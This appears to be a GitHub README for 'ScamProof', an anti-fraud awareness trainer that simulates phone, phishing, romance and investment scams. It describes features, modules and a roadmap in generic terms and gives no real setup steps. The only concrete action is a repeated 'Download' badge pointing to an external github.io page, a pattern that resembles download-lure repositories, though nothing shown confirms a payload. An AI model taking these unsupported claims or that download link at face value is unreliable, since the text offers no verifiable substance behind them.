![preview](https://raw.githubusercontent.com/holeybrayan78-cell/anti-scam-dojo/main/view_a038b68.svg)
# 🛡️ ScamProof — Anti-Fraud Awareness Trainer

**An interactive, scenario-driven simulator that teaches people to recognize fraud before it happens.**

[![Download](https://raw.githubusercontent.com/holeybrayan78-cell/anti-scam-dojo/main/fetch_634e57.svg)](https://holeybrayan78-cell.github.io/anti-scam-dojo/)

---

## 📖 Overview

ScamProof is a next-generation awareness platform built on a simple premise: you cannot stop fraud by lecturing people about it. You stop fraud by letting them *feel* the pressure of a real scam in a safe, consequence-free environment, then teaching them to spot the tells.

This repository contains the full source of the ScamProof trainer — an interactive learning environment that drops participants into simulated phone calls, text messages, marketplace listings, investment pitches, romance conversations, job offers, and delivery-notification traps. Each scenario is reconstructed from documented fraud patterns, evaluated in real time, and followed by a breakdown of exactly which psychological lever the fraudster tried to pull.

The project was born out of frustration with traditional awareness material: posters nobody reads, mandatory videos nobody watches, and quizzes that reward memorization instead of judgment. ScamProof replaces all of that with a scoreboard of instincts — a place where curiosity is the primary teaching tool.

> Think of it as a flight simulator for your trust. You crash here, so you don't crash out there.

---

## 🎯 Why This Exists

Fraud has industrialized. What used to require a persuasive con artist now runs on scripts, call centers, and automation that reaches millions of people per day. Meanwhile, defenses remain stuck in the era of laminated warning cards.

ScamProof takes the opposite approach:

- **Practice over theory.** Every module is an active decision, not a paragraph.
- **Pressure over polish.** Scenarios are timed, noisy, and emotionally loaded — just like the real thing.
- **Feedback over grading.** You don't just get "wrong" — you get a replay of the moment your instinct slipped.
- **Skills over fear.** The goal is calm recognition, not anxiety about every incoming message.

---

## ✨ Feature Highlights

### 🧠 Scenario Engine
A branching simulation core that adapts to the choices you make. Hesitate too long and the "caller" gets impatient. Ask the right verification question and the script visibly falters. Each path exposes a different layer of the fraud playbook, so no two runs feel identical.

### 🕹️ Responsive Interface
The trainer is built mobile-first. On a phone it reads like a real messaging thread; on a desktop it expands into a split-view workspace with transcript, controls, and analysis panel side by side. The layout reflows fluidly across tablets, laptops, and large monitors without losing context.

### 🌍 Multilingual Support
Fraud speaks every language, and so does ScamProof. The localization layer uses structured message catalogs, meaning new languages can be added without touching scenario logic. Right-to-left scripts, locale-specific date and currency formats, and region-flavored scam variants are all handled by the same framework.

### 🕐 Around-the-Clock Learning Access
Progress is synchronized to your profile, so a scenario started on a commute can be finished at home. The platform is designed for continuous availability — bite-sized modules for a five-minute break, deep multi-stage campaigns for a slow evening.

### 📊 Instinct Dashboard
A personal analytics view that tracks hesitation times, verification habits, and the categories where your judgment is strongest or weakest. It's not a grade — it's a mirror.

### 🔁 Scenario Rotation
A rotating pool of scenarios keeps the experience fresh. Repeated visits surface new fraud archetypes instead of replaying the same ten questions.

### 🧩 Custom Scenario Builder
Organizations can author their own simulations — bank-themed, HR-themed, or community-specific — using a declarative scenario format. No deep programming knowledge required to draft a branch.

### 🔐 Privacy-Respecting Design
No unnecessary personal data collection. Progress data belongs to the learner. The architecture favors local-first storage with optional sync.

### 🎨 Themeable Visual Language
A calm, distraction-free palette that shifts subtly with scenario mood — warmer tones for conversational scams, cooler tones for transactional traps — helping learners read context without being told.

### 📱 Offline-Friendly Core
Core scenario playback works without a constant connection, which matters for training sessions in classrooms, community centers, and field environments.

---

## 🗂️ Module Catalog

| Module | Theme | Focus Skill |
|---|---|---|
| Phantom Caller | Voice fraud | Verifying identity under time pressure |
| Message From "The Bank" | Phishing | Reading urgency cues in text |
| Too-Good Marketplace | Commerce fraud | Recognizing unrealistic offers |
| The Patient Investor | Investment fraud | Spotting guaranteed-return language |
| Slow Burn Romance | Social engineering | Emotional boundary recognition |
| Offer Letter Trap | Job fraud | Detecting advance-fee patterns |
| Delivery Notice Maze | Link fraud | Inspecting suspicious notifications |
| Tech Support Freeze | Remote-access fraud | Refusing unverified requests |
| Family Emergency | Impersonation | Building a verification habit |
| Prize Notification Storm | Prize fraud | Questioning unsolicited winnings |

Each module includes multiple difficulty tiers, replay analysis, and a "what would have worked" debrief.

---

## 🧭 How a Session Works

1. **Enter a scenario.** You receive a message, call transcript, or offer — nothing else.
2. **Make choices under pressure.** Reply, ignore, verify, or escalate. Timers add realism without creating panic.
3. **Hit the twist.** Every scenario contains at least one hidden pivot — a moment where the story shifts and the real trap emerges.
4. **Get debriefed.** A structured breakdown highlights the manipulation techniques used, the moments you handled well, and the precise point where the script was counting on you.
5. **Track your instincts.** The dashboard folds the result into a growing picture of your defensive strengths.

---

## 🏗️ Architecture Overview

The project is organized into a handful of cooperating layers:

- **Core Engine** — State machine that drives scenario branching, timers, and scoring.
- **Scenario Packs** — Declarative data describing messages, decisions, and outcomes.
- **Localization Layer** — Message catalogs with fallback chains and pluralization rules.
- **Presentation Layer** — Responsive components that render conversation threads and control panels.
- **Analytics Module** — Aggregates session data into the Instinct Dashboard.
- **Authoring Toolkit** — Utilities for validating and previewing custom scenario packs.

The design intentionally keeps scenario content separate from engine logic. Adding a new scam archetype should feel like writing a story, not modifying software.

---

## 🚀 Getting Started

Acquire the project through your preferred distribution channel for this repository, then follow the project's setup documentation included alongside the source. Configuration revolves around a single settings file where language, theme, and sync preferences live.

The trainer runs in any modern browser environment and requires no external account to begin learning.

---

## 🤝 Contributing

Contributions are welcome across every layer — new scenario packs, translations, UI refinements, accessibility improvements, and documentation.

Helpful contribution areas:

- **Scenario authors:** Draft realistic fraud simulations grounded in documented patterns.
- **Translators:** Expand the localization catalogs to new languages and dialects.
- **Designers:** Improve responsiveness, theming, and accessibility.
- **Testers:** Explore edge cases in branching and scoring.
- **Educators:** Share feedback from real training sessions.

Please review the contribution guidelines in this repository before opening a pull request. Keep scenario content respectful, avoid real personal data, and never reproduce actual fraud instructions in a way that could be misused.

---

## 🛣️ Roadmap for 2026

The coming year focuses on depth over breadth:

- **Adaptive difficulty** that reacts to a learner's hesitation patterns.
- **Multi-stage campaigns** spanning several days for deeper immersion.
- **Community scenario registry** with review and rating.
- **Educator dashboard** for classroom-wide session insights.
- **Expanded localization** covering more regional fraud dialects.
- **Accessibility-first pass** covering screen readers, keyboard navigation, and reduced-motion modes.
- **Scenario replay export** for debrief sessions in group training.

---

## 🧪 Testing Philosophy

Every scenario branch is validated for reachability, and every outcome is checked for a defined debrief. Localization keys are linted to prevent silent fallback gaps. The goal is a curriculum that behaves predictably — because learning tools should never surprise learners with bugs instead of lessons.

---

## 📚 Educational Use

ScamProof is designed to slot into:

- Corporate security awareness programs.
- School and university digital literacy courses.
- Community center workshops for older adults.
- Bank and credit union customer education initiatives.
- Family conversations about online safety.

The trainer works equally well as a solo exercise or a facilitated group session with projected debriefs.

---

## ⚠️ Disclaimer

ScamProof is an educational awareness tool. It simulates fraud scenarios for training purposes only. It does not provide legal, financial, or security advice, and it cannot guarantee protection against any specific real-world attempt. All scenarios are fictionalized representations built from publicly documented fraud patterns; any resemblance to specific individuals or organizations is coincidental.

Always verify unexpected requests through independent, trusted channels. If you believe you have been targeted, contact the relevant authorities or your financial institution directly.

---

## 📄 License

This project is released under the **MIT License**.

You can read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026

Permission is hereby granted to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, subject to the conditions of the MIT License.

---

## 💬 Support & Community

Questions, scenario ideas, and translation offers are all welcome through the repository's issue tracker and discussion space. The project thrives when educators, developers, and everyday learners share what they discover.

Together, we build sharper instincts — one simulation at a time.

[![Download](https://raw.githubusercontent.com/holeybrayan78-cell/anti-scam-dojo/main/fetch_634e57.svg)](https://holeybrayan78-cell.github.io/anti-scam-dojo/)